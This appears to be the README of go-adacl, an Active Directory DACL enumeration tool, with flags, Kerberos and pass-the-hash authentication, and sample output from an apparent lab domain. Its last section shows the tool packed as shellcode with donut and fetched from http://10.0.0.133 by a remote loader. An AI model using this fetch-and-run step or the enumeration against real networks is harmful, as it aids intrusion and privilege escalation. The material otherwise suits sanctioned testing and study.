A DACL enumeration tool.

Should work fine in either Windows or Linux.

Based on:
- [go-ldap](github.com/go-ldap/ldap/v3)
- [go-krb5](github.com/jcmturner/gokrb5/v8)
- [go-sddlparse](github.com/huner2/go-sddlparse/v2)
- [go-objectsid](github.com/bwmarrin/go-objectsid)
- [impacket](https://github.com/fortra/impacket) (mostly for figuring out what stuff is and how it works)

## Building
```sh
go build .
```

Cross-compiling for Windows:
```sh
GOOS=windows go build .
```

## Usage
Parameters:
```
  -s, --secure                            use ldaps instead of ldap
      --host string                       ldap server with optional port (eg dc.mydomain.local or 10.0.0.10, or 10.0.0.10:389)
  -d, --domain string                     domain
  -u, --username string                   username
  -p, --password string                   password
  -H, --pth string                        authenticate using a hash
  -k, --kerberos                          use kerberos (username/password if specified, ccache if specified or KRB5CCNAME environment variable if set)
      --ntlm                              username/password authentication using ntlm
      --spn string                        ldap spn for kerberos (eg ldap/dc.mydomain.local), will default to 'ldap/' and the host argument
      --dc-host string                    kdc hostname or ip, will default to host argument
      --ccache string                     ccache for kerberos (either a filename, or a base64 encoded hash)
      --ldap-bind                         perform a ldap bind (eg username will be the dn instead of an actual username)

      --search-dn stringArray             list of dns to collect from
      --search-only-default-dn            collect only from default dn

      --exclude-dns stringArray           exclude objects living in these dn:s
      --include-dns stringArray           include only objects living in these dn:s
      --exclude-uninteresting-dns         exclude uninteresting dn:s (default true)
      --include-trustee stringArray       include only objects with these trustees (dn, sid or principal) (will resolve groups)
  -I, --include-me                        if set, the results from 'whoami' will be added to '--include-trustee'
      --exclude-uninteresting-trustees    exclude boring trustees (default true)
      --exclude-trustee strings           exclude trustees (sid or principal) (will *not* resolve groups)
      --include-principals                only include objects where the trustee is a principal
      --include-interesting-ace-types     only include interesting ace types (default true)
      --include-interesting-accessmasks   only include interesting access masks (default true)
      --exclude-inherited                 exclude inherited aces
      --exclude-inherit-only              exclude aces that are only inherited and does not apply to current object

      --stdout                            print results to stdout (default true)
      --json string                       write results to a json file
      --cache string                      cache file
      --loglevel string                   log level (see logrus for details) (default "info")
      --debug                             print ldap debug information (this does not imply --loglevel debug)
  -h, --help                              help for go-adacl
```

Environment variables:
```
  ADACL_OPTS                              when this is set the command line will be ignored and parameters are read from here instead
```

### A note on Kerberos
Relevant flags:
- `-s` / `--secure` - use ldaps
- `--host` - hostname or ip for ldap server
- `-k` / `--kerberos` - enable kerberos
- `-d` / `--domain` - kerberos realm
- `-u` / `--username` - username
- `-p` / `--password` - password
- `--spn` - manual spn (this will default to `ldap/` + the value from `--host`, needs to be set if interacting with an IP)
- `--dc-host` - specify DC host manually (this can be an IP, that's fine); should only be specified if ldap host is different than the KDC (which is unlikely)
- `--ccache` - load a ccache from file (also accepts a base64 encoded ccache)

When dealing with hosts that don't resolve through DNS, the SPN must be defined manually (everything else can be IP:s though):
```sh
go-adacl \
    --secure                        \ # always opt for the secure version, if possible 
    --host 10.0.0.10                \ # ldap server ip address
    --kerberos                      \ # enable kerberos authentication
    --domain mydomain.local         \ # domain name
    --username iamauser             \ # username
    --password secret               \ # password
    --spn ldap/dc.mydomain.local    \ # <-- THIS IS IMPORTANT IF HOST IS AN IP; this is the domaincontroller LDAP SPN
    --dc-host 10.0.0.10             \ # you probably never have to set this, but IP or hostname is fine here
    ...
```

### Examples
```
$ impacket-getTGT lumons.hacksmarter/intranetsvc:'*'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in intranetsvc.ccach

$ export KRB5CCNAME=intranetsvc.ccache

$ go-adacl -d lumons.hacksmarter -s --host DC01.lumons.hacksmarter -k --include-trustee peterk --exclude-trustee 'Authenticated Users','Domain Users' --exclude-inherit-only --loglevel debug
DEBU[0000] attempting to dial ldap 'ldaps://DC01.lumons.hacksmarter:636'
DEBU[0000] attempting to load ccache from file 'intranetsvc.ccache'
DEBU[0000] parsed ccache: realm='LUMONS.HACKSMARTER', principal='intranetsvc'
DEBU[0000] collected whoami: 'u:LUMONS\IntranetSvc'
DEBU[0000] collected server configuration: defaultNamingContext='DC=lumons,DC=hacksmarter', namingContexts='[[DC=lumons,DC=hacksmarter CN=Configuration,DC=lumons,DC=hacksmarter CN=Schema,CN=Configuration,DC=lumons,DC=hacksmarter DC=DomainDnsZones,DC=lumons,DC=hacksmarter DC=ForestDnsZones,DC=lumons,DC=hacksmarter]]
DEBU[0000] collecting information from: dn='DC=lumons,DC=hacksmarter'
DEBU[0001] collecting information from: dn='CN=Configuration,DC=lumons,DC=hacksmarter'
DEBU[0002] collecting information from: dn='CN=Schema,CN=Configuration,DC=lumons,DC=hacksmarter'
DEBU[0002] collecting information from: dn='DC=DomainDnsZones,DC=lumons,DC=hacksmarter'
DEBU[0002] collecting information from: dn='DC=ForestDnsZones,DC=lumons,DC=hacksmarter'
DEBU[0002] collected 3801 dns, 85 principals and 23589 aces
DEBU[0002] adding sid 'S-1-5-21-2415474065-2758488157-2192222713-1108' (CN=Peter Kilmer,OU=Management,OU=Lumons Users,OU=PE,DC=lumons,DC=hacksmarter)
DEBU[0002] adding sid 'S-1-5-21-2415474065-2758488157-2192222713-513' (CN=Domain Users,CN=Users,DC=lumons,DC=hacksmarter)
DEBU[0002] adding sid 'S-1-5-32-545' (CN=Users,CN=Builtin,DC=lumons,DC=hacksmarter)
DEBU[0002] adding sid 'S-1-5-21-2415474065-2758488157-2192222713-1112' (CN=Web Admins,OU=Lumons Groups,OU=PE,DC=lumons,DC=hacksmarter)
DEBU[0002] adding sid 'S-1-5-21-2415474065-2758488157-2192222713-1110' (CN=LapsAdmins,OU=Lumons Groups,OU=PE,DC=lumons,DC=hacksmarter)
DEBU[0002] resolved 8 filters
- OU=Lumons Users,OU=PE,DC=lumons,DC=hacksmarter
  ACEType:               ACCESS_DENIED
  AccessMask:            DeleteChild
  SecurityIdentifier:    S-1-1-0 (Everyone)

- CN=INTRANET,OU=Lumons Servers,OU=PE,DC=lumons,DC=hacksmarter (computer: INTRANET$)
  ACEType:               ACCESS_ALLOWED_OBJECT
  ACEFlags:              INHERITED, CONTAINER_INHERIT
  AccessMask:            ControlAccess
  SecurityIdentifier:    S-1-5-21-2415474065-2758488157-2192222713-1110 (group: lapsAdmins)
  Object type:           ms-LAPS-Password
  Inherited object type: Computer

- CN=INTRANET,OU=Lumons Servers,OU=PE,DC=lumons,DC=hacksmarter (computer: INTRANET$)
  ACEType:               ACCESS_ALLOWED_OBJECT
  ACEFlags:              CONTAINER_INHERIT, INHERITED
  AccessMask:            ControlAccess
  SecurityIdentifier:    S-1-5-21-2415474065-2758488157-2192222713-1110 (group: lapsAdmins)
  Object type:           ms-LAPS-EncryptedPassword
  Inherited object type: Computer

- CN=INTRANET,OU=Lumons Servers,OU=PE,DC=lumons,DC=hacksmarter (computer: INTRANET$)
  ACEType:               ACCESS_ALLOWED_OBJECT
  ACEFlags:              CONTAINER_INHERIT, INHERITED
  AccessMask:            ReadProp, ControlAccess
  SecurityIdentifier:    S-1-5-21-2415474065-2758488157-2192222713-1110 (group: lapsAdmins)
  Object type:           ms-LAPS-EncryptedPasswordHistory
  Inherited object type: Computer

DEBU[0002] 4 aces processed, and 23585 were filtered
```

#### 1: Working with cached collections
This will
- On first execution this will login using kerberos (simple, username+password), and save collected information to `/tmp/acl-cache`
- On subsequent execution it will load cached information from `/tmp/acl-cache` and no ldap connections will be made
- The results of the filtering will be written to stdout (default)
- The results of the filtering will also be writted in a "nice" json format to `output.json` for further querying

```sh
go-adacl --host dc.mydomain.local -k -d mydomain.local -u iamauser -p secret --cache /tmp/acl-cache --json output.json
```

#### 2: Using a ccache
```sh
# Get a TGT
impacket-getTGT mydomain.local/iamauser:secret

# Use the TGT
go-adacl --host dc.mydomain.local -d mydomain.local -k --ccache iamauser.ccache
```

#### 3: As shellcode
Prep
```
$ donut --file go-adacl.exe                                                

  [ Donut shellcode generator v1 (built Mar 10 2025 15:50:28)
  [ Copyright (c) 2019-2021 TheWover, Odzhan

  [ Instance type : Embedded
  [ Module file   : "go-adacl.exe"
  [ Entropy       : Random names + Encryption
  [ File type     : EXE
  [ Target CPU    : x86+amd64
  [ AMSI/WDLP/ETW : continue
  [ PE Headers    : overwrite
  [ Shellcode     : "loader.bin"
  [ Exit          : Thread
```

On remote host (you need your own shellcode loader)
```powershell
$env:ADACL_OPTS="--host dc.mydomain.local -d mydomain.local -u iamauser -p secret"

scloader.exe http://10.0.0.133/loader.bin
```
